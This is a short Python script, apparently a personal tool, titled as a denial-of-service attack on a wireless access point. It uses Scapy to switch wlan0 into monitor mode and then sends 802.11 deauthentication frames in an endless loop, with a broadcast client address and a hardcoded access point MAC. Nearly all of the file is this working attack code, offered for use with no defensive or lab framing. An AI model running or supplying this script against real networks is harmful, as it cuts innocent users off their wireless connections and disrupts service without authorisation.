'''
###########################################
Author: Qaidjohar Jawadwala
Organization: QJ Technologies.
--------------------------------------------
Code Title: Denial-of-Service attack on Wireless AP using Python
-------------------------------------------
#Steps fo Implementation:
---Import Scapy
---Shift wireless interface to monitoring mode
---Create a deAuthentication frame with Target Client and Target AP MAC
---Send the frame on the network in loop
---On Ending the execution, shift wireless interface back to managed mode
---Restart the server

#Extensions to be performed
--Add command line arguments and user inputs on execution
Example:
python wifi_dos <channel of AP> <MAC of AP> <MAC of Client> <interface>

#################################################
'''

import time  # Giving Delay
import os  # running system commands
import sys  # Handle arguments and other system funcion
import signal  # Handle Keyboad Interrupts

from scapy.all import *  # Importing Scapy
conf.verb = 0  # Dont display any non-sense Scapy Outputs
conf.iface = "wlan0"  # Select interface to be used by scapy to send packets


def init():
    # Killing all WIfI Blocking Services
    os.system("airmon-ng check kill")
    # Shifting the interface to monitor mode
    os.system("ifconfig wlan0 down")
    os.system("iwconfig wlan0 mode monitor")
    os.system("ifconfig wlan0 up")
    # setting the wireless interface channel
    os.system("iw dev wlan0 set channel 1")
    print("wlan0 initialized to Monitor Mode")


def signal_handler(signal, frame):
    # shifting the interface back to managed mode on exit
    os.system("ifconfig wlan0 down")
    os.system("iwconfig wlan0 mode managed")
    os.system("ifconfig wlan0 up")
    # restarting the network interface
    os.system("service network-manager restart")
    print "Wi-Fi Deauth Tool Stopped Successfully"
    sys.exit(0)


# Calling a callback on pressing Ctrl+C
signal.signal(signal.SIGINT, signal_handler)


# Starting the program execution
if __name__ == "__main__":
    init()
    client_mac = "ff:ff:ff:ff:ff:ff"
    ap_mac = "1c:1d:86:b6:c4:e0"

    # Creating a deAuth Frame
    deAuthFrame = RadioTap()/Dot11(addr1=client_mac, addr2=ap_mac,
                                   addr3=ap_mac)/Dot11Deauth()

    # Sending a deAuth Frame on network
    while True:
        sendp(deAuthFrame)
        print "Sent DeAuth Frame to ", client_mac, " from AP ", ap_mac
        time.sleep(1)
